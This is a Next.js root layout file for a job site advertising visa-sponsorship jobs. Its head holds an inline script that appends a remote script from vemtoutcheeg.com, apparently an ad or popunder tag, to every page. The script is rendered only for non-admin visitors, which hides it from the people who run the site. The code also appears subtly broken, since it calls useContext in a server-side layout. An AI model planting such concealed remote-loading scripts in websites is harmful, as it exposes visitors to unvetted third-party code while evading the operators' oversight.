import 'bootstrap/dist/css/bootstrap.min.css';
import './globals.css';

import ClientLayoutWrapper from './ClientLayoutWrapper';
import { useContext } from 'react';
import { AuthContext } from '../context/AuthContext';

export const metadata = {
  title: 'Sponsorship Visa Jobs - Find Your Next Career Opportunity',
  description: 'Discover thousands of job opportunities across various industries and locations. Your ultimate destination for job searching and career growth.',
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const authContext = useContext(AuthContext);
  const isAdmin = authContext?.isAdmin;

  return (
    <html lang="en">
      <head>
        {!isAdmin && (
          <script dangerouslySetInnerHTML={{ __html: "(function(s){s.dataset.zone='9773560',s.src='https://vemtoutcheeg.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))" }} />
        )}
      </head>
      <body>
        <ClientLayoutWrapper>{children}</ClientLayoutWrapper>
      </body>
    </html>
  );
}